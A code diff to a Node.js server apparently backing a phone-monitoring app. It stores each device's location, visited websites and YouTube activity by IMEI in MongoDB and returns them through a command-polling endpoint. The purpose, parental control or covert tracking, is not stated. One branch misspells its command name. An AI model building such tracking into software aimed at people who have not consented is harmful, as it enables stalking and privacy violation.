@@ -138,6 +138,9 @@ async function f() {
             CommandResults[imei] = data;
             console.log(data);
             console.log("-------in sendYoutube");
+            await db.collection("devices").updateOne({imei:imei}, {$set:{youtube:data}}, {upsert:true});
+            let d = await db.collection("devices").findOne({imei:imei});
+            console.log(d);
             res.send("1");
         });
         app.post("/sendWebSites", async function (req, res) {
@@ -150,6 +153,9 @@ async function f() {
             CommandResults[imei] = data;
             console.log(data);
             console.log("-------in sendWebSites");
+            await db.collection("devices").updateOne({imei:imei}, {$set:{website:data}}, {upsert:true});
+            let d = await db.collection("devices").findOne({imei:imei});
+            console.log(d);
             res.send("1");
         });
         app.post("/sendLocation", async function (req, res) {
@@ -162,6 +168,9 @@ async function f() {
             CommandResults[imei] = data;
             console.log(data);
             console.log("-------in sendLocation");
+            await db.collection("devices").updateOne({imei:imei}, {$set:{location:data}}, {upsert:true});
+            let d = await db.collection("devices").findOne({imei:imei});
+            console.log(d);
             res.send("1");
         });
         app.get("/sendCommand", async function (req, res) {
@@ -185,7 +194,7 @@ async function f() {
                 t++;
                 //console.log(t + " in sendCommand");
                 //console.log(CommandResults);
-                if(false) {
+                if(CommandResults[imei] != undefined) {
                     res.send(CommandResults[imei]);
                     clearInterval(f);
                     CommandResults[imei] = undefined;
@@ -193,8 +202,14 @@ async function f() {
                 if(t == 10) {
                     clearInterval(f);
                     let ans;
-                    if(cmd == 'sendActivity') {
+                    if(cmd == 'sendActivity' && d.activity != undefined) {
                         res.send(d.activity);
+                    }else if(cmd == 'sendLocation' && d.location != undefined){
+                        res.send(d.location);
+                    } else if(cmd == 'sendWensites' && d.website != undefined){
+                        res.send(d.website);
+                    }else if(cmd == 'sendYoutube' && d.youtube != undefined) {
+                        res.send(d.youtube);
                     }else {
                         res.send("0");
                     }
